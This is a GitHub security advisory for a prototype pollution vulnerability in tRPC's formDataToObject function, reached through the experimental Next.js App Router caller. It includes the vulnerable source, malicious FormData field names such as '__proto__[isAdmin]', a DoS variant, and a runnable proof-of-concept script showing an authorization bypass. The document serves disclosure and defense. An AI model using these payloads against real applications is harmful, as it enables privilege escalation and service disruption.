# [H] tRPC has possible prototype pollution in `experimental_nextAppDirCaller`

## Summary
Severity: High
Advisory: GHSA-43p4-m455-4f4j
CVE: CVE-2025-68130
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:L/SC:L/SI:H/SA:L (CVSS_V4)
Published: 2025-12-16
Source: https://github.com/advisories/GHSA-43p4-m455-4f4j
Type: github-advisory

## Affected
- npm: `@trpc/server` — affected >=10.27.0 <10.45.3
- npm: `@trpc/server` — affected >=11.0.0 <11.8.0

## Details
> Note that this vulnerability is only present when using `experimental_caller` / `experimental_nextAppDirCaller`.

## Summary

A Prototype Pollution vulnerability exists in `@trpc/server`'s `formDataToObject` function, which is used by the Next.js App Router adapter. An attacker can pollute `Object.prototype` by submitting specially crafted FormData field names, potentially leading to authorization bypass, denial of service, or other security impacts.

## Affected Versions

- **Package:** `@trpc/server`
- **Affected Versions:** >=10.27.0
- **Vulnerable Component:** `formDataToObject()` in `src/unstable-core-do-not-import/http/formDataToObject.ts`

## Vulnerability Details

### Root Cause

The `set()` function in `formDataToObject.ts` recursively processes FormData field names containing bracket/dot notation (e.g., `user[name]`, `user.address.city`) to create nested objects. However, it does **not** validate or sanitize dangerous keys like `__proto__`, `constructor`, or `prototype`.

### Vulnerable Code

```typescript
// packages/server/src/unstable-core-do-not-import/http/formDataToObject.ts
function set(obj, path, value) {
  if (path.length > 1) {
    const newPath = [...path];
    const key = newPath.shift();  // ← No validation of dangerous keys
    const nextKey = newPath[0];

    if (!obj[key]) {  // ← Accesses obj["__proto__"] which returns Object.prototype
      obj[key] = isNumberString(nextKey) ? [] : {};
    }
    
    set(obj[key], newPath, value);  // ← Recursively pollutes Object.prototype
    return;
  }
  // ...
}

export function formDataToObject(formData) {
  const obj = {};
  for (const [key, value] of formData.entries()) {
    const parts = key.split(/[\.\[\]]/).filter(Boolean);  // Splits "__proto__[isAdmin]" → ["__proto__", "isAdmin"]
    set(obj, parts, value);
  }
  return obj;
}
```

### Attack Vector

When a user submits a form to a tRPC mutation using Next.js Server Actions, the `nextAppDirCaller` adapter processes the FormData:

```typescript
// packages/server/src/adapters/next-app-dir/nextAppDirCaller.ts:88-89
if (normalizeFormData && input instanceof FormData) {
  input = formDataToObject(input);  // ← Vulnerable call
}
```

An attacker can craft FormData with malicious field names:

```javascript
const formData = new FormData();
formData.append("__proto__[isAdmin]", "true");
formData.append("__proto__[role]", "superadmin");
```

When processed, this pollutes `Object.prototype`:

```javascript
{}.isAdmin        // → "true"
{}.role           // → "superadmin"
```

## Proof of Concept

```bash
# Step 1: Create the project directory

mkdir trpc-vuln-poc
cd trpc-vuln-poc

# Step 2: Initialize npm

npm init -y

# Step 3: Install vulnerable tRPC

npm install @trpc/server@11.7.2

# Step 4: Create the test file 
```
---

### Test.js

```javascript
const { formDataToObject } = require('@trpc/server/unstable-core-do-not-import');

console.log("=== PoC Prototype Pollution en tRPC ===\n");

console.log("[1] Estado inicial:");
console.log("    {}.isAdmin =", {}.isAdmin);

const fd = new FormData();
fd.append("__proto__[isAdmin]", "true");
fd.append("__proto__[role]", "superadmin");
fd.append("username", "attacker");

console.log("\n[2] FormData malicioso:");
console.log('    __proto__[isAdmin] = "true"');
console.log('    __proto__[role] = "superadmin"');

console.log("\n[3] Llamando formDataToObject()...");
const result = formDataToObject(fd);
console.log("    Resultado:", JSON.stringify(result));

console.log("\n[4] Después del ataque:");
console.log("    {}.isAdmin =", {}.isAdmin);
console.log("    {}.role =", {}.role);

const user = { id: 1, name: "john" };
console.log("\n[5] Impacto en autorización:");
console.log("    Usuario normal:", JSON.stringify(user));
console.log("    user.isAdmin =", user.isAdmin);

if (user.isAdmin) {
    console.log("\n    VULNERABLE - Authorization bypass exitoso!");
} else {
    console.log("\n    ✓ Seguro");
}
```

## Impact

### Authorization Bypass (HIGH)

Many applications check user permissions using property access:

```javascript
// Vulnerable pattern
if (user.isAdmin) {
  // Grant admin access
}
```

After pollution, **all objects** will have `isAdmin: "true"`, bypassing authorization.

### Denial of Service (MEDIUM)

Polluting commonly used property names can crash applications:

```javascript
formData.append("__proto__[toString]", "not_a_function");
// All subsequent .toString() calls will fail
```

## References
- https://github.com/trpc/trpc/security/advisories/GHSA-43p4-m455-4f4j
- https://nvd.nist.gov/vuln/detail/CVE-2025-68130
- https://github.com/trpc/trpc/commit/78629d524968ef8db5a7adf68d8b95a44369d77e
- https://github.com/trpc/trpc
